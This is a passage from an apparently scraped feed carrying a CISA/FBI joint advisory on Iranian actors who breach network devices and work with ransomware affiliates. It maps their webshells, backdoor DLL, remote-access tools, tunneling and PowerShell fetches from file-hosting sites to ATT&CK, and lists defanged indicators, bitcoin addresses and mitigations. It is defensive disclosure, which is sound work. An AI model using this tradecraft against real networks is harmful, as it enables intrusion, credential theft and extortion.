<li>Place a malicious backdoor version.dll in <code>C:\\Windows\\ADFS\\</code> directory [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1505/003/\" title=\"Server Software Component: Web Shell\">T1505.003</a>].</li>
<li>Use a scheduled task to load malware through installed backdoors [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1053/\" title=\"Scheduled Task/Job\">T1053</a>].</li>
<li>Deployment of Meshcentral to connect with compromised servers for remote access [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1219/\" title=\"Remote Access Software\">T1219</a>].</li>
<li>For persistence and as detection and mitigation occurs, the actors create a daily Windows service task with random eight characters and attempt execution of a similarly named DLL contained in the <code>C:\\Windows\\system32\\drivers</code>\\ directory. For example, a service named “test” was observed attempting to load a file located at <code>C:\\WINDOWS\\system32\\drivers\\test.sys</code> [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1505/\" title=\"Server Software Component\">T1505</a>].</li>
</ul>
<h3>Execution, Privilege Escalation, and Defense Evasion</h3>
<ul>
<li>Repurpose compromised credentials from exploiting networking devices, such as Citrix Netscaler, to log into other applications (i.e., Citrix XenDesktop) [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1078/003/\" title=\"Valid Accounts: Local Accounts\">T1078.003</a>].</li>
<li>Repurpose administrative credentials of network administrators to log into domain controllers and other infrastructure on victim networks [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1078/002/\" title=\"Valid Accounts: Domain Accounts\">T1078.002</a>].</li>
<li>Use administrator credentials to disable antivirus and security software, and lower PowerShell policies to a less secure level [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1562/001/\" title=\"Impair Defenses: Disable or Modify Tools\">T1562.001</a>][<a href=\"https://attack.mitre.org/versions/v15/techniques/T1562/010/\" title=\"Impair Defenses: Downgrade Attack\">T1562.010</a>].</li>
<li>Attempt to enter security exemption tickets to the network security device or contractor to get the actor’s tools allowlisted <a>[</a><a href=\"https://attack.mitre.org/versions/v15/techniques/T1562/001/\" title=\"Impair Defenses: Disable or Modify Tools\">T1562.001</a>].</li>
<li>Use a compromised administrator account to initiate a remote desktop session to another server on the network. In one instance, the FBI observed this technique being used to attempt to start Microsoft Windows PowerShell Integrated Scripted Environment (ISE) to run the command “Invoke-WebRequest” with a URI including <code>files.catbox[.]moe</code>. Catbox is a free, online file hosting site the actors use as a repository/hosting mechanism [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1059/001/\" title=\"Command and Scripting Interpreter: PowerShell\">T1059.001</a>].</li>
</ul>
<h3>Discovery</h3>
<ul>
<li>Export system registry hives and network firewall configurations on compromised servers [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1012/\" title=\"Query Registry\">T1012</a>].</li>
<li>Exfiltrate account usernames from the victim domain controller, as well as access configuration files and logs—presumably to gather network and user account information for use in further exploitation efforts [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1482/\" title=\"Domain Trust Discovery\">T1482</a>].</li>
</ul>
<h3>Command and Control</h3>
<ul>
<li>Install “AnyDesk” remote access program as a backup access method [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1219/\" title=\"Remote Access Software\">T1219</a>].</li>
<li>Enable servers to use Windows PowerShell Web Access [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1059/001/\" title=\"Command and Scripting Interpreter: PowerShell\">T1059.001</a>].</li>
<li>Use the open source tunneling tool Ligolo (ligolo/ligolo-ng) [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1572/\" title=\"Protocol Tunneling\">T1572</a>].</li>
<li>Use NGROK (ngrok[.]io) deployment to create outbound connections to a random subdomain [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1572/\" title=\"Protocol Tunneling\">T1572</a>].</li>
</ul>
<h3>Exfiltration and Impact</h3>
<p>After infiltrating victim networks, the actors collaborate with ransomware affiliates (including NoEscape, Ransomhouse, and ALPHV [aka BlackCat]) in exchange for a percentage of the ransom payments by providing affiliates with access to victim networks, locking victim networks, and strategizing to extort victims <a>[</a><a href=\"https://attack.mitre.org/versions/v15/techniques/T1657/\" title=\"Financial Theft\">T1657</a>]. The actors also conduct what is assessed to be separate set of malicious activity—stealing sensitive data from victims [<a href=\"https://attack.mitre.org/versions/v15/tactics/TA0010/\" title=\"Exfiltration\">TA0010</a>], likely in support of the GOI.</p>
<h2><strong>MITRE ATT&amp;CK Tactics and Techniques</strong></h2>
<p>See <strong>Table 1</strong> to <strong>Table 9</strong> for all referenced threat actor tactics and techniques in this advisory.</p>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 1. Reconnaissance</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use or Assessed Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Search Open Technical Databases</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1596/\" title=\"Search Open Technical Databases\">T1596</a></td>
<td>Iranian cyber actors use Shodan (<code>Shodan[.]io</code>) to identify internet infrastructure hosting devices vulnerable to particular CVEs.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 2. Initial Access</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use or Assessed Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Exploit Public-Facing Application</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1190/\" title=\"Exploit Public-Facing Application\">T1190</a></td>
<td>
<p>Iranian cyber actors scan and exploit public-facing networking devices, including the following devices and associated CVEs:</p>
<ul>
<li>Citrix Netscaler (CVEs-2019-19781 and CVE-2023-3519)</li>
<li>F5 BIG-IP (CVE-2022-1388)</li>
<li>Pulse Secure/Ivanti VPNs (CVE-2024-21887)</li>
<li>PanOS firewalls (CVE-2024-3400)</li>
<li>Check Point Security Gateways (CVE-2024-24919)</li>
</ul>
</td>
</tr>
<tr>
<td>External Remote Services</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1133/\" title=\"External Remote Services\">T1133</a></td>
<td>Iranian cyber actors create <code>/xui/common/images/</code> directory on targeted IP addresses.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 3. Persistence</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use or Assessed Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Server Software Component: Web Shell</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1505/003/\" title=\"Server Software Component: Web Shell\">T1505.003</a></td>
<td>Iranian cyber actors capture login credentials on compromised Netscaler devices via deployed webshell; create a directory on Netscaler devices for webshell deployment; deploy webshells on compromised Netscaler devices in two directories (observed closely after system owning patching); and place the malicious backdoor <code>version.dll</code>.</td>
</tr>
<tr>
<td>Create Account (Local Account)</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1136/\" title=\"Create Account (Local Account)\">T1136.001</a></td>
<td>Iranian cyber actors create local accounts on victim networks.</td>
</tr>
<tr>
<td>Account Manipulation</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1098/\" title=\"Account Manipulation\">T1098</a></td>
<td>Iranian cyber actors request exemptions to zero-trust application for tools they intend to deploy.</td>
</tr>
<tr>
<td>Scheduled Task/Job</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1053/\" title=\"Scheduled Task/Job\">T1053</a></td>
<td>Iranian cyber actors implement a scheduled task that uses a DLL side-loading technique and a scheduled task that loads malware through back doors.</td>
</tr>
<tr>
<td>Server Software Component</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1505/\" title=\"Server Software Component\">T1505</a></td>
<td>Iranian cyber actors implement the daily creation of a Windows service task for persistence as detection and mitigation occur.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 4. Privilege Escalation</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use or Assessed Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Valid Accounts: Local Accounts</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1078/003/\" title=\"Valid Accounts: Local Accounts\">T1078.003</a></td>
<td>Iranian cyber actors repurpose compromised credentials (e.g., from a Netscaler device) to log into other applications.</td>
</tr>
<tr>
<td>Valid Accounts: Domain Accounts</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1078/002/\" title=\"Valid Accounts: Domain Accounts\">T1078.002</a></td>
<td>Iranian cyber actors repurpose administrative credentials of network admins to log into domain controllers and other infrastructure.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 5. Defense Evasion</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use or Assessed Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Impair Defenses: Disable or Modify Tools</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1562/001/\" title=\"Impair Defenses: Disable or Modify Tools\">T1562.001</a></td>
<td>Iranian cyber actors use administrator credentials to disable antivirus and security software.</td>
</tr>
<tr>
<td>Impair Defenses: Disable or Modify Tools</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1562/001/\" title=\"Impair Defenses: Disable or Modify Tools\">T1562.001</a></td>
<td>Iranian cyber actors attempt to enter security exemption tickets to the network security device or contractor to get their tools allowlisted.</td>
</tr>
<tr>
<td>Impair Defenses: Downgrade Attack</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1562/010/\" title=\"Impair Defenses: Downgrade Attack\">T1562.010</a></td>
<td>Iranian cyber actors lower PowerShell policies to a less secure level.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 6. Credential Access</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use or Assessed Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Input Capture</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1056/\" title=\"Input Capture\">T1056</a>&nbsp;</td>
<td>Iranian cyber actors capture login credentials on compromised Netscaler devices via a deployed webshell.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 7. Execution</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use or Assessed Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Command and Scripting</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1059/001/\" title=\"Command and Scripting\">T1059.001</a></td>
<td>Iranian cyber actors use an admin account to initiate a remote desktop session to start Microsoft Windows PowerShell ISE.</td>
</tr>
<tr>
<td>Command and Scripting Interpreter</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1059/001/\" title=\"Command and Scripting Interpreter\">T1059.001</a></td>
<td>Iranian cyber actors enable servers to use Windows PowerShell Web Access.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 8. Discovery</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use or Assessed Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Query Registry</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1012/\" title=\"Query Registry\">T1012</a></td>
<td>Iranian cyber actors export registry hives and network firewall configurations.</td>
</tr>
<tr>
<td>Domain Trust Discovery</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1482/\" title=\"Domain Trust Discovery\">T1482</a></td>
<td>Iranian cyber actors exfiltrate account usernames from the domain controller and access configuration files and logs.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 9. Command and Control</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use or Assessed Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Remote Access Software</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1219/\">T1219</a></td>
<td>
<p>Iranian cyber actors install “AnyDesk” remote access program.</p>
<p>Iranian cyber actors deploy Meshcentral to connect with compromised servers for remote access.</p>
</td>
</tr>
<tr>
<td>Protocol Tunneling</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1572/\" title=\"Protocol Tunneling\">T1572</a></td>
<td>Iranian cyber actors use <code>ligolo / ligolo-ng</code> for open source tunneling and <code>ngrok[.]io</code> NGROK to create outbound connections to a random subdomain.</td>
</tr>
</tbody>
</table>
</div>
<div>
<h2><strong>Indicators of Compromise</strong></h2>
<h3>IP Address and Domain Identifiers</h3>
<p><strong>Disclaimer:</strong> The IP addresses and domains listed in <strong>Table 10</strong> were observed in use by the actors in the specified timeframes in 2024. The authoring agencies recommend organizations investigate or vet these IP addresses prior to taking action, such as blocking.</p>
<p><strong>Comment:&nbsp;</strong>In addition to the infrastructure provided in the table below, the FBI and CISA warn that these actors are known to leverage information obtained through intrusions into cloud-computing resources associated with victim organizations. The actors have used this cloud infrastructure to conduct further cyber operations targeting other organizations. The FBI observed use of this tradecraft against U.S. academic and defense sectors, but it could theoretically be used against any organization. The FBI and CISA warn that if these actors compromised your organization, they may be leveraging your cloud services accounts to conduct malicious cyber activity and target other victims. The FBI has observed instances of the actors using compromised cloud service accounts to transmit data stolen from other compromised organizations.</p>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 10. Indicators of Compromise – Recent</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Indicator</th>
<th role=\"columnheader\">First Seen</th>
<th role=\"columnheader\">Most Recently Observed Date</th>
</tr>
</thead>
<tbody>
<tr>
<td>138.68.90[.]19</td>
<td>January 2024</td>
<td>August 2024</td>
</tr>
<tr>
<td>167.99.202[.]130</td>
<td>January 2024</td>
<td>August 2024</td>
</tr>
<tr>
<td>78.141.238[.]182</td>
<td>July 2024</td>
<td>August 2024</td>
</tr>
<tr>
<td>51.16.51[.]81</td>
<td>January 2024</td>
<td>August 2024</td>
</tr>
<tr>
<td>51.20.138[.]134</td>
<td>February 2024</td>
<td>August 2024</td>
</tr>
<tr>
<td>134.209.30[.]220</td>
<td>March 2024</td>
<td>August 2024</td>
</tr>
<tr>
<td>13.53.124[.]246</td>
<td>February 2024</td>
<td>August 2024</td>
</tr>
<tr>
<td>api.gupdate[.]net</td>
<td>September 2022</td>
<td>August 2024</td>
</tr>
<tr>
<td>githubapp[.]net</td>
<td>February 2024</td>
<td>August 2024</td>
</tr>
</tbody>
</table>
<p><strong>Disclaimer:</strong> The infrastructure in <strong>Table 11</strong> reflects historical IP addresses and domains associated with these actors. This data is being provided for informational purposes and to enable better tracking and attribution of these actors. The FBI and CISA do not recommend blocking of the indicators in <strong>Table 11&nbsp;</strong>based solely on their inclusion in this CSA.</p>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><a><em>Table&nbsp;</em></a><em>11. Indicators of Compromise – Historical</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Indicator</th>
<th role=\"columnheader\">First Seen</th>
<th role=\"columnheader\">Most Recently Observed Date</th>
</tr>
</thead>
<tbody>
<tr>
<td>18.134.0[.]66</td>
<td>September 2023</td>
<td>November 2023</td>
</tr>
<tr>
<td>193.149.190[.]248</td>
<td>September 2023</td>
<td>January 2024</td>
</tr>
<tr>
<td>45.76.65[.]42</td>
<td>September 2023</td>
<td>December 2023</td>
</tr>
<tr>
<td>206.71.148[.]78</td>
<td>October 2023</td>
<td>January 2024</td>
</tr>
<tr>
<td>193.149.187[.]41</td>
<td>October 2023</td>
<td>November 2023</td>
</tr>
<tr>
<td>login.forticloud[.]online</td>
<td>October 2023</td>
<td>November 2023</td>
</tr>
<tr>
<td>fortigate.forticloud.[]online</td>
<td>October 2023</td>
<td>November 2023</td>
</tr>
<tr>
<td>cloud.sophos[.]one</td>
<td>October 2023</td>
<td>November 2023</td>
</tr>
</tbody>
</table>
</div>
<h3>Actor Identifiers</h3>
<p><strong>Disclaimer:</strong> The FBI observed the following identifiers associated with the Iranian cyber group and their ransomware affiliates. The FBI is providing this information to enable improved threat actor identification and tracking of malicious cyber activity. Please see <strong>Appendix A</strong> for list of TOX identifiers.</p>
<p>The FBI observed the threat actors to be associated with the following bitcoin address values:</p>
<ul>
<li><code>bc1q8n7jjgdepuym825zwwftr3qpem3tnjx3m50ku0</code></li>
<li><code>bc1qlwd94gf5uhdpu4gynk6znc5j3rwk9s53c0dhjs</code></li>
<li><code>bc1q2egjjzmchtm3q3h3een37zsvpph86hwgq4xskh</code></li>
<li><code>bc1qjzw7sh3pd5msgehdaurzv04pm40hm9ajpwjqky</code></li>
<li><code>bc1qn5tla384qxpl6zt7kd068hvl7y4a6rt684ufqp</code></li>
<li><code>bc1ql837eewad47zn0uzzjfgqjhsnf2yhkyxvxyjjc</code></li>
<li><code>bc1qy8pnttrfmyu4l3qcy59gmllzqq66gmr446ppcr</code></li>
<li><code>bc1q6620fmev7cvkfu82z43vwjtec6mzgcp5hjrdne</code></li>
<li><code>bc1qr6h2zcxlntpcjystxdf7qy2755p25yrwucm4lq</code></li>
<li><code>bc1qx9tteqhama2x2w9vwqsyny6hldh8my8udx5jlm</code></li>
<li><code>bc1qz75atxj4dvgezyuspw8yz9khtkuk5jpdgfauq8</code></li>
<li><code>bc1q6w2an66vrje747scecrgzucw9ksha66x9zt980</code></li>
<li><code>bc1qsn4l6h3mhyhmr72vw4ajxf2gr74hwpalks2tp9</code></li>
<li><code>bc1qtjhvqkun4uxtr4qmq6s3f7j49nr4sp0wywp489</code></li>
</ul>
<h2><strong>Mitigations</strong></h2>
<p>The FBI and CISA recommend all organizations implement the mitigations listed below to improve their cybersecurity posture based on the Iranian cyber group’s activity. The FBI judges the group’s targeting is primarily based on the identification of devices vulnerable to CVEs named in this notification (see <strong>Technical Details</strong> section for a list of CVEs). As such, any U.S. organization deploying software with these vulnerabilities may be targeted for further exploitation and should follow this guidance to defend against exploitation by this group.</p>
<p>These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s&nbsp;<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals\" title=\"Cross-Sector Cybersecurity Performance Goals\">Cross-Sector Cybersecurity Performance Goals</a> for more information on the CPGs, including additional recommended baseline protections.</p>
<p>The FBI and CISA recommend all organizations implement the following mitigations:</p>
<ul>
<li>Review available logs for IP addresses in <strong>Table 10</strong> for indications of traffic with your organization’s network in the provided timeframes [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#DetectingRelevantThreatsandTTPs3A\" title=\"Detecting Relevant Threats and TTPs (3.A)\">CPG 3.A</a>]. The indicators in Table 11 should also be reviewed to identify historical activity or incidents which may have previously been identified by your organization.</li>
<li>Apply patches and/or mitigations for CVE-2024-3400, CVE-2022-1388, CVE-2019-19781, and CVE-2023-3519 [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#MitigatingKnownVulnerabilities1E\" title=\"Mitigating Known Vulnerabilities (1.E)\">CPG 1.E</a>].
<ul>
<li>Be advised, patching for the above referenced CVEs may be insufficient to mitigate malicious activity if your network has already been compromised by these actors while the network device was vulnerable. Additional investigation into the use of stolen credentials (e.g., via the webshell on Netscaler devices) is strongly encouraged to identify threat actor attempts to establish footholds on other parts of the network [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#DetectingRelevantThreatsandTTPs3A\" title=\"Detecting Relevant Threats and TTPs (3.A)\">CPG 3.A</a>].</li>
</ul>
</li>
<li>Check your systems for the unique identifiers and TTPs used by the actors when operating on compromised networks, including creation of specific usernames, use of NGROK and Ligolo, and deployment of webshells in specific directories [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#DetectingRelevantThreatsandTTPs3A\" title=\"Detecting Relevant Threats and TTPs (3.A)\">CPG 3.A</a>].</li>
<li>Check your systems for outbound web requests to <code>files.catbox[.]moe</code> and <code>***.ngrok[.]io</code> [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#DetectingRelevantThreatsandTTPs3A\" title=\"Detecting Relevant Threats and TTPs (3.A)\">CPG 3.A</a>].</li>
</ul>
<h2><strong>Validate Security Controls</strong></h2>
<p>In addition to applying mitigations, the FBI and CISA recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&amp;CK for Enterprise framework in this advisory. The authoring agencies recommend testing your existing security controls inventory to assess how they perform against the ATT&amp;CK techniques described in this advisory.</p>
<p>To get started:</p>
<ol>
<li>Select an ATT&amp;CK technique described in this advisory (see <strong>Table 2</strong> to <strong>Table 10</strong>).</li>
<li>Align your security technologies against the technique.</li>
<li>Test your technologies against the technique.</li>
<li>Analyze your detection and prevention technologies’ performance.</li>
<li>Repeat the process for all security technologies to obtain a set of comprehensive performance data.</li>
<li>Tune your security program, including people, processes, and technologies, based on the data generated by this process.</li>
</ol>
<h2><strong>References</strong></h2>
<ol>
<li><a href=\"https://attack.mitre.org/versions/v15/groups/G0117/\" title=\"Fox Kitten\">Fox Kitten, UNC757, Parisite, Pioneer Kitten, RUBIDIUM, Lemon Sandstorm, Group G0117 | MITRE ATT&amp;CK®</a>&nbsp;</li>
<li><a href=\"https://www.crowdstrike.com/blog/who-is-pioneer-kitten/\" title=\"Who Is PIONEER KITTEN?\">PIONEER KITTEN: Targets &amp; Methods [Adversary Profile] (crowdstrike.com)</a></li>
<li><a href=\"https://www.sentinelone.com/anthology/noescape/\" title=\"NoEscape Ransomware: In-Depth Analysis, Detection, and Mitigation\">NoEscape - SentinelOne</a></li>
<li><a href=\"https://www.sentinelone.com/anthology/ransomhouse/\" title=\"RansomHouse Ransomware: In-Depth Analysis, Detection, and Mitigation\">RansomHouse - SentinelOne</a></li>
<li><a href=\"https://attack.mitre.org/versions/v15/software/S0556/\" title=\"Pay2Key\">Pay2Key, Software S0556 | MITRE ATT&amp;CK®</a></li>
<li><a href=\"https://research.checkpoint.com/2020/ransomware-alert-pay2key/\" title=\"Ransomware Alert: Pay2Key\">Pay2Key Ransomware Alert - Check Point Research</a></li>
</ol>
<h2><strong>Reporting</strong></h2>
<p>Your organization has no obligation to respond or provide information back to the FBI in response to this joint advisory. If, after reviewing the information provided, your organization decides to provide information to the FBI, reporting must be consistent with applicable state and federal laws.</p>
<h3>Ransomware Incidents</h3>
<p>The FBI and CISA are interested in any information that can be shared in the case of a ransomware incident, to include boundary logs showing communication to and from foreign IP addresses, a sample ransom note, communications with threat actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file.</p>
<p>Additional details of interest include a targeted company point of contact, status and scope of infection, estimated loss, operational impact, transaction IDs, date of infection, date detected, initial attack vector, and host- and network-based indicators.</p>
<p>The FBI and CISA do not encourage paying ransom as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, the FBI and CISA urge you to promptly report ransomware incidents to the FBI’s <a href=\"https://www.ic3.gov/Home/ComplaintChoice\" title=\"Internet Crime Complain Center (IC3)\">Internet Crime Complain Center (IC3)</a>, your <a href=\"https://www.fbi.gov/contact-us/field-offices\" title=\"Field Offices\">local FBI Field Office</a>, or CISA via the agency’s <a href=\"https://www.cisa.gov/report\" title=\"Report to CISA\">Incident Reporting Form</a> or its 24/7 Operations Center (<a href=\"mailto:report@cisa.gov)\" title=\"Report to CISA\">report@cisa.gov</a>), or by calling 1-844-Say-CISA (1-844-729-2472).</p>
<h3>Other Incidents</h3>
<p>U.S. organizations are encouraged to report suspicious or criminal activity related to information in this advisory to the FBI’s <a href=\"https://www.ic3.gov/Home/ComplaintChoice\" title=\"Internet Crime Complain Center (IC3)\">Internet IC3</a> or your <a href=\"https://www.fbi.gov/contact-us/field-offices\" title=\"Field Offices\">local FBI Field Office</a>. Report suspicious or malicious cyber activity to CISA via the agency’s <a href=\"https://www.cisa.gov/report\" title=\"Report to CISA\">Incident Reporting Form</a> or its 24/7 Operations Center (<a href=\"mailto:report@cisa.gov\" title=\"Report to CISA\">report@cisa.gov</a>) or by calling 1-844-Say-CISA (1-844-729-2472). When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact.</p>
<h2><strong>Disclaimer</strong></h2>
<p>The information in this report is being provided “as is” for informational purposes only. The FBI and CISA do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by FBI and CISA.</p>
<h2><strong>Version History</strong></h2>
<p><strong>August 20, 2024:</strong> Initial version.</p>
<h2><strong>Appendix A: TOX Identifiers</strong></h2>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">TOX Identifier</th>
<th role=\"columnheader\">TOX Public Key</th>
<th role=\"columnheader\">Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>xplfinder</td>
<td>ea2ec0c3859d8d8c36d95a298beef6d7add17856655bfbea2554b8714f7c7c69</td>
<td>Iranian cyber group</td>
</tr>
<tr>
<td>Br0k3r</td>
<td>B761680E23F2EBB5F6887D315EBD05B2D7C365731E093B49ADB059C3DCCAA30C</td>
<td>Iranian cyber group</td>
</tr>
<tr>
<td>Access</td>
<td>185ADA4556737A4F26AE16F1A99CA82AB5684C32719EE426C420C0BC14384A0A</td>
<td>Ransomware affiliate</td>
</tr>
<tr>
<td>Admin ALPHV aka BlackCat</td>
<td>3488458145EB62D7D3947E3811234F4663D9B5AEEF6584AB08A2099A7F946664</td>
<td>Ransomware affiliate</td>
</tr>
<tr>
<td>Admin_NoEscape</td>
<td>0A6F992E1372DB4F245595424A7436EBB610775D6ADDC4D568ACC2AF5D315221</td>
<td>Ransomware affiliate</td>
</tr>
<tr>
<td>Americano_Sneeckers</td>
<td>14F8AD7D1553D1A47CF4C9E7BEDABCC5B759C86E54C636175A472C11D7DEC70F</td>
<td>Ransomware affiliate</td>
</tr>
<tr>
<td>Bettersock</td>
<td>2C76104C9AAAF32453A814C227E7D9D755451B551A3FD30D2EA332DF396B3A31</td>
<td>Ransomware affiliate</td>
</tr>
</tbody>
</table>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
") (pubDate nil "Fri, 23 Aug 2024 12:41:53 EDT") (creator nil "CISA") (guid ((isPermaLink . "false")) "/node/22056"))) ("North Korea Cyber Group Conducts Global Espionage Campaign to Advance Regime’s Military and Nuclear Programs" "<h2><strong>Summary</strong></h2>
<p>The U.S. Federal Bureau of Investigation (FBI) and the following authoring partners are releasing this Cybersecurity Advisory to highlight cyber espionage activity associated with the Democratic People’s Republic of Korea (DPRK)’s Reconnaissance General Bureau (RGB) 3rd Bureau based in Pyongyang and Sinuiju:</p>
<ul>
<li>U.S. Cyber National Mission Force (CNMF)</li>
<li>U.S. Cybersecurity and Infrastructure Security Agency (CISA)</li>
<li>U.S. Department of Defense Cyber Crime Center (DC3)</li>
<li>U.S. National Security Agency (NSA)</li>
<li>Republic of Korea’s National Intelligence Service (NIS)</li>
<li>Republic of Korea’s National Police Agency (NPA)</li>
<li>United Kingdom’s National Cyber Security Centre (NCSC)</li>
</ul>
